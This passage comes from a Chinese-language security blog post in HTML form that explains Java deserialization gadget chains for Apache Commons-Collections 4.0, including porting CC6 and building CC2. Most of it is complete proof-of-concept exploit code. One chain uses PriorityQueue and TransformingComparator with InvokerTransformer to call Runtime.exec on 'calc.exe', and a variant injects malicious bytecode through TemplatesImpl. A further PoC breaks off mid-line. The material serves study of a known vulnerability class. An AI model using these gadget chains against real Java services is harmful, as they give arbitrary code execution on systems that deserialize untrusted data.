&lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现</p>
+<p>老的Gadget中依赖的包名都是 <code>org.apache.commons.collections</code> ，而新的包名已经变了，是 <code>org.apache.commons.collections4</code></p>
+<p>所以</p>
+<p>我们应该将所 有 <code>import org.apache.commons.collections.*</code> 改成 <code>import org.apache.commons.collections4.*</code> </p>
+<p>但是改后还是由一个错误</p>
+<p>报LazyMap.decorate的错误</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a012894c.png" alt="image-20240604151122791"></p>
+<p>我们先看看原来CC6里的LazyMap.decorate的定义</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff181c9.png" alt="image-20240604151310700"></p>
+<p>这个报错的原因肯定是在新的依赖里面没有这个类</p>
+<p>而我们应该怎么在<code>Commons-Collections=4.0</code>调用这个decorate呢</p>
+<p>我们直接在新依赖里找有相同功能的类</p>
+<p>以进来就直接看到了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff6679f.png" alt="image-20240604151703352"></p>
+<p>这不是和我们需要的decorate一模一样吗</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="title function_">lazyMap</span><span class="params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="built_in">super</span> K, ? extends V&gt; factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<p>我们只要替换一下名字即可</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>这样就行</p>
+<p>没问题了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a00b2ca7.png" alt="image-20240604152112128"></p>
+<p>应该是可以运行了</p>
+<p>没问题</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0281f41.png" alt="image-20240604152156999"></p>
+<p><strong>既然CC6可以在<code>Commons-Collections=4.0</code>下运行</strong></p>
+<p><strong>那么我们之前构造的CC1和CC3肯定也是没问题的</strong></p>
+<p>这里就不多说了</p>
+<h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>那么<code>Commons-Collections=4.0</code>有没有新链子吗</p>
+<p>当然</p>
+<p>这就是CC2与CC4</p>
+<p>这里我们先学习CC2</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>先上poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="链子构造与分析"><a href="#链子构造与分析" class="headerlink" title="链子构造与分析"></a>链子构造与分析</h3><p>commons-collections这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其 中包含了一些可以<strong>执行任意方法的Transformer</strong>。所以，在commons-collections中找Gadget的过 程，实际上可以简化为，<strong>找一条从 Serializable.readObject() 方法到 Transformer.transform() 方法的调用链</strong>。</p>
+<p>好 现在我们再来看CC2的POC</p>
+<p>CC2里有两个关键类</p>
+<ul>
+<li>java.util.PriorityQueue</li>
+<li>org.apache.commons.collections4.comparators.TransformingComparator</li>
+</ul>
+<p>为什么说这两个类关键呢</p>
+<p><code>java.util.PriorityQueue</code> 是⼀个有自己 <strong>readObject()</strong> 方法的类</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a00a8beb.png" alt="image-20240604154010148"></p>
+<p>而<code>org.apache.commons.collections4.comparators.TransformingComparator</code> 中有调 ⽤ <strong>transform()</strong> 方法的函数：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a00d5372.png" alt="image-20240604154228127"></p>
+<p>所以我们就可以知道CC2就是一条从<code>PriorityQueue.readObject()</code> 到 <code>TransformingComparator.comapare.transform()</code> 的利用链</p>
+<p>好 接下来就是把他们给串起来</p>
+<p>我们之前说过 <strong>readObject()是java反序列化的起点</strong></p>
+<p>所以我们从<code>PriorityQueue.readObject()</code>开始 来看看它调用了什么类&#x2F;方法</p>
+<p>首先<code>PriorityQueue.readObject()</code>调用了<code>heapify()</code>方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ffdb5cd.png" alt="image-20240604155347151"></p>
+<p>点进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff6ae88.png" alt="image-20240604155523603"></p>
+<p>发现<code>heapify()</code>调用了<code>siftDown()</code>方法</p>
+<p>点进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ffe0c98.png" alt="image-20240604155658700"></p>
+<p><code>siftDown()</code>调用链<code>siftDownUsingComparator()</code>方法</p>
+<p>点进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a002c7f9.png" alt="image-20240604155804822"></p>
+<p>回来了 调用了compare方法</p>
+<p>这样一来链子就通了</p>
+<p>链子还是能简单的</p>
+<p>接下来就可以构造我们的链子了</p>
+<p>首先，还是<strong>创建Transformer</strong>，基作：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br></pre></td></tr></table></figure>
+
+<p>嗯 你没看错 一模一样的哈</p>
+<p>然后就是创建⼀个 TransformingComparator ，传入我们的Transformer：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>好 我们实例化 PriorityQueue 对象，第⼀个参数是初始化时的大小，至少需要2个元素才会触发排序和比较， 所以是2；第二个参数是比较时的Comparator，传入前面实例化的comparator：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>后面<strong>随便添加了2个数字进去</strong>，这里可以传入<strong>非null的任意对象</strong>，因为我们的Transformer是忽略传入参 数的</p>
+<p>最后，将真正的恶意Transformer设置上：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>
+
+<p>当然 得有setFieldValue方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       field.set(obj, value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>定义了一个名为 <code>setFieldValue</code> 的静态方法，它接受三个参数：一个是目标对象 <code>obj</code>，一个是要修改的字段名 <code>fieldName</code>（字符串类型），最后一个是要设置给该字段的新值 <code>value</code>。这个方法的主要作用是利用 Java 反射 API 动态地修改指定对象中某个字段的值，具体步骤如下：</p>
+<ol>
+<li><strong>获取 Field 对象</strong>：通过 <code>obj.getClass().getDeclaredField(fieldName)</code> 获取目标对象 <code>obj</code> 类中声明的、名为 <code>fieldName</code> 的字段。<code>getDeclaredField</code> 方法可以访问私有字段，但不包括父类的字段。</li>
+<li><strong>开放访问权限</strong>：由于直接访问私有字段通常受到限制，所以使用 <code>field.setAccessible(true)</code> 方法来取消 Java 访问控制检查，允许后续代码修改这个字段的值，即使它原本是 private 的。</li>
+<li><strong>设置字段值</strong>：最后，通过 <code>field.set(obj, value)</code> 实际设置 <code>obj</code> 对象中 <code>fieldName</code> 字段的值为 <code>value</code>。</li>
+</ol>
+<p>然后就是最后的序列化与反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(queue);</span><br><span class="line">oos.close();<span class="comment">//序列化流</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"><span class="comment">//反序列化</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后就组成了我们的POC啦</p>
+<p><strong>调用流程</strong>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject-&gt;</span><br><span class="line">	PriorityQueue.heapify-&gt;</span><br><span class="line">		PriorityQueue.siftDown-&gt;</span><br><span class="line">			PriorityQueue.siftDownUsingComparator-&gt;</span><br><span class="line">				TransformingComparator.compare-&gt;</span><br><span class="line">					ChainedTransformer.transform-&gt;.......</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="CC2的进化之路"><a href="#CC2的进化之路" class="headerlink" title="CC2的进化之路"></a>CC2的进化之路</h2><p>在CC3中 我们知道用 TemplatesImpl 可以构造出无Transformer数组的利用</p>
+<p>这里我们也可以用这个来进化一下我们的CC2</p>
+<h3 id="进化失败"><a href="#进化失败" class="headerlink" title="进化失败"></a>进化失败</h3><p>创建 <code>TemplatesImpl</code> 对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建⼀个人畜无害的 <code>InvokerTransformer</code> 对象，并用它实例化 <code>Comparator</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>样实例化 <code>PriorityQueue</code> ，但是此时向队列里添加的元素就是我们前面创建的 <code>TemplatesImpl </code>对象了：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(obj);</span><br><span class="line">queue.add(obj)</span><br></pre></td></tr></table></figure>
+
+<p>因为我们这里无法再使用<code>Transformer</code>数组，所以也就不能用 <code>ConstantTransformer</code> 来初始化变量，需要接受外部传入的变量。而在 <code>Comparator.compare()</code> 时，队列里的元素将作为参数传入<code>transform()</code> 方法，这就是传给 <code>TemplatesImpl.newTransformer</code> 的参数。</p>
+<p>最后⼀步，将 <code>toString</code> 方法改成恶意方法 <code>newTransformer</code> ：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最后就形成了我们的CC2进化POC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln.deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytescode() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(evil.EvilTemplatesImpl.class.getName());</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getBytescode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(obj);</span><br><span class="line">        queue.add(obj);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个POC我一直爆evil的错 目前还没有解决  没有找到相应的包</p>
+<p>但是整体的代码逻辑和升级思路没问题</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0190d6f.png" alt="image-20240604192911997"></p>
+<h3 id="进化成功"><a href="#进化成功" class="headerlink" title="进化成功"></a>进化成功</h3><p>这里我从新找了一个POC来</p>
+<p>思路是一样的 </p>
+<p>都是通过用了javassist动态构造了我们恶意类的字节码</p>
+<p>再来CC3的思路</p>
+<h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC22</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span 